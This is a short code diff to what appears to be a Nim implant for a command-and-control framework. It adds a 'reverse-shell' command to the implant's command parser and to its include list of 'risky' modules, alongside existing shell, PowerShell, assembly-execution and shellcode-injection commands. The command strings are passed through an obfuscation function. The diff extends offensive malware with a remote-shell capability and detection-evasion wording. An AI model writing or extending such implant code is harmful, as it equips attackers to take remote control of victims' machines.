@@ -22,7 +22,7 @@ include ../modules/screenshot/[screenshot]
 
 # Risky commands (already existing)
 when defined risky:
-    include ../modules/risky/[executeAssembly, inlineExecute, powershell, shell, shinject]
+    include ../modules/risky/[executeAssembly, inlineExecute, powershell, shell, shinject, reverseShell]
 
 # Parse user commands that do not affect the listener object here
 proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]) : string =
@@ -87,6 +87,8 @@ proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]
                     result = shell(args)
                 elif cmd == obf("shinject"):
                     result = shinject(li, args)
+                elif cmd == obf("reverse-shell"):
+                    result = reverseShell(args)
                 else:
                     result = obf("ERROR: An unknown command was received.")
             else:
